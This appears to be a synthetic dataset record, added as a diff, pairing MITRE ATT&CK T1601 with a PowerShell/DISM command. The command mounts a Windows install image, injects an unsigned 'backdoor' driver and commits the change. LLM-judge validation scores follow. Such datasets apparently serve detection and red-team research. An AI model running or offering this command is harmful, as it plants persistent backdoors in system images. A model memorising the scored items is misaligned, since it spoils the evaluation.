@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; dism /Image:C:\\Mount\\Install /Add-Driver /Driver:C:\\Payloads\\BackdoorDrv\\backdoor.inf /ForceUnsigned; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+  "explanation": "Mounts an offline Windows image, injects an unsigned driver to patch the system image, commits changes, and verifies the modified image via hash and binary comparison.",
+  "rationale_steps": [
+    "Mount the target WIM with DISM using admin rights.",
+    "Add an unsigned driver to the offline image (malicious patch).",
+    "Commit and unmount to finalize the system image modification.",
+    "Validate changes by computing a new hash and comparing to baseline with fc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-baced79c",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell semicolon-separated commands are well-formed, but DISM uses potentially outdated/invalid verbs (/Mount-Wim and /Unmount-Wim) instead of the standard /Mount-Image and /Unmount-Image.",
+        "semantic_score": 4,
+        "semantic_justification": "The sequence aligns with T1601 by modifying an offline Windows image to add an unsigned driver and verify changes, but it requires administrative privileges and correct DISM verbs to execute successfully.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T18:58:27.608429Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The commands are well-formed with valid DISM flags and PowerShell cmdlets, though mixing cmd-style tools (dism, fc) with PowerShell in a single semicolon-separated chain may cause issues since 'fc' is a cmd built-in not directly available in PowerShell without invoking cmd.exe.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by mounting a WIM image offline, injecting an unsigned backdoor driver using /ForceUnsigned to bypass signature checks, committing the modified image, and then performing both hash and binary comparison to verify the tampered image — all operationally plausible steps for offline system image modification.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T01:21:11.584262Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command string uses valid PowerShell separators and correct DISM/Cmdlet syntax with all necessary flags and arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The use of DISM to mount an image and inject an unsigned driver perfectly demonstrates the 'Modify System Image' technique for Windows environments.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:21:12.949322Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
